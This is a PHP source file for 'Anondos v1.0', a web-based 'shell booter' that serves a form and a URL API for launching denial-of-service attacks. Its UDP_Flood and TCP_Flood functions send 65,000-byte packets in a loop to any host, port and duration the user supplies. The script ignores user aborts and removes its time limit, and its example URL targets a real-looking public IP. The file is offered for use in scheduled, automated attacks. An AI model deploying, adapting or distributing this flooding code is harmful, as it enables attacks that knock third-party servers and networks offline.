<?php
        $ip = $_SERVER['SERVER_ADDR'];
        $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
		$myna = $_SERVER[PHP_SELF];

 ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Anondos v1.0 - web based api shell boot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Styles -->
    <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap.css" rel="stylesheet">
    <link href="http://getbootstrap.com/2.3.2/assets/css/bootstrap-responsive.css" rel="stylesheet">
    <link href="http://getbootstrap.com/2.3.2/assets/css/docs.css" rel="stylesheet">
	<!-- End of styles -->
<center>
<img src="http://img15.hostingpics.net/pics/368343logos.png" alt="Anondos">
</center>
<div class="well">
<center>
<div align="left">
  
</div>
<div align="right">
<span class="label label-info">IP : <?echo $ip;?> </span>
  <span class="label label-info">v 1.0</span>
</div>
    <?php if(empty($_GET['type'])) { ?><br>
<form action="" method="get">
<input type="text" name="host" placeholder="Host"><br>
<input type="text" name="port" placeholder="Port"><br>
<input type="text" name="time" placeholder="Time"><br>
<select name="type">
    <optgroup label="Methodes 1">
    <option value="UDP">UDP</option>
    <option value="TCP">TCP</option>
</opt>

    <optgroup label="Methodes 2">
    <option value="UDP">HOME CONNECTION</option>
    <option value="TCP">SSYN</option>
</opt>
</select><br>
<input type="submit" style="width: 220px" class="btn btn-success" value="Launch DoS Attack">
</form>

<form action="" method="get">
<input type="submit" style="width: 220px" class="btn btn-danger" value="Stop">
</form>
<?php } ?>

 <?php
    $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
 
        if ( isset( $_GET['type'] ) )
                {
                       $type = $_GET['type'];
        $host = $_GET['host'];
        $time = $_GET['time'];
        $port = $_GET['port'];
        $page = $_GET['page'];
    $myna = $_SERVER[PHP_SELF];
    $name  = basename($_SERVER['PHP_SELF']);
                       if ( $type == "api" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' )
                                {
                                }
                        else
                                {
                                $page .= '                      <table class="text">' . "\n"; 
                                $page .= '                      <span class="label label-info">API</span><b></b><br /><br />' . "\n";
								$page .= '                      <span class="label label-default">Format : </span><b></b><br /><br /> <pre class="prettyprint linenums">'.$name.'?host=[host]&port=[port]&time=[time]&type=[method (UDP/TCP)]</pre>' . "\n";
								$page .= '                      Its easy to use the api you have just to add the host, port, time and the type of attack.<b></b><br /><br />' . "\n";
							    $page .= '                      <span class="label label-default">Example : </span><b></b><br /><br /> <pre class="prettyprint linenums">'.$name.'?host=216.58.208.132&port=80&time=5&type=UDP</pre>' . "\n"; 
						        $page .= '                      You can use the api to schedule automated attacks with a booter or a shell booter, <a href="?i=1">Go Back ?</a>' . "\n";
                                $page .= '                      </table>' . "\n";
                                }
                        }
                if ( $type == "UDP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' )
                                {
                                $page .= UDP_FLOOD( $host , $time );
                                }
                        else
                                {
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <span class="label label-danger"> Error ! </span>' . "\n";
								$page .= '                      Please fill up the form to continue, <a href="?i=1">Go Back ?</a>' . "\n";
                                $page .= '                      </table>' . "\n";
                                }
                        }
                elseif ( $type == "TCP" )
                        {
                        if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['port'] != '' )
                                {
                                $page .= TCP_FLOOD ( $host , $port , $time );
                                }
                        else
                                {
                                $page .= '                      <table class="text">' . "\n";
                                $page .= '                      <span class="label label-danger"> Error ! </span>' . "\n";
								$page .= '                      Please fill up the form to continue, <a href="?i=1">Go Back ?</a>' . "\n";
                                $page .= '                      </table>' . "\n";
                                }
               
                        }
                else
                        {
                     
                        }
                }
        else
                {
              
                }
 
        $page .= '              <br /></div>' . "\n";
        $page .= '      </body>' . "\n";
        $page .= '</html>' . "\n";
 
        print$page;
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// UDP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function UDP_Flood( $host , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                $max_time = time() + $length;
 
                $packet = "";
                $packets = 0;
 
                while( strlen ( $packet ) < 65000 )
                        {
                        $packet .= Chr( 255 );
                        }
 
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        $rand = rand( 1 , 65535 );
                        @$fp = fsockopen( 'udp://'.$host, $rand, $errno, $errstr, 5 );
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<span class="label label-info">UDP</span><b></b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred ! Could not send packets,</b> <a href="?i=1">Go Back ?</a>' . "\n";
                        }
                else
                        {
                        $rtn  = '<span class="label label-info">UDP</span><b></b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s )</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
		                $rtn .= '<br /><b>Succes ! The attack was sent,</b> <a href="?i=1">Go Back ?</a>' . "\n";
                        }
 
                return$rtn;
                }
 
/////////////////////////////////////////////////////////////////////////////////////////////////////////
// TCP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////////////
 
        function TCP_Flood( $host , $port , $length )
                {
                ignore_user_abort(TRUE);
                set_time_limit(0);
 
                $max_time = time() + $length;
 
                $packet = "";
                $packets = 0;
 
                while( strlen ( $packet ) < 65000 )
                        {
                        $packet .= Chr( 255 );
                        }
 
                @$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
 
                while( 1 )
                        {
                        if ( time() > $max_time )
                                {
                                break;
                                }
 
                        if( $fp )
                                {
                                fwrite( $fp , $packet );
                                fclose( $fp );
                                $packets++;
                                }
                        else
                                {
                                @$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
                                }
                        }
 
                if ( $packets == 0 )
                        {
                        $rtn  = '<span class="label label-info">TCP</span><b></b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '</table>' . "\n";
                        $rtn .= '<br /><b>An error occurred ! Could not send packets,</b> <a href="?i=1">Go Back ?</a>' . "\n";
                        }
                else
                        {
                        $rtn  = '<span class="label label-info">TCP</span><b></b><br /><br />' . "\n";
                        $rtn .= '<table class="text">' . "\n";
                        $rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s )</td></tr>' . "\n";
                        $rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";   
						$rtn .= '</table>' . "\n";
					    $rtn .= '<br /><b>Succes ! The attack was sent,</b> <a href="?i=1">Go Back ?</a>' . "\n";
                        }
 
                return$rtn;
                }
             
?>
</center>
</div>
<div align="center">
  <a href="?type=api"><span class="label label-info">How to use api ?</span></a></br>
  </br> <a href="https://www.instant-hack.io/" target="_blank"> <span class="label label-info">Copyright © 2016 Instant-hack.io. All rights reserved.</span></a>
</div>
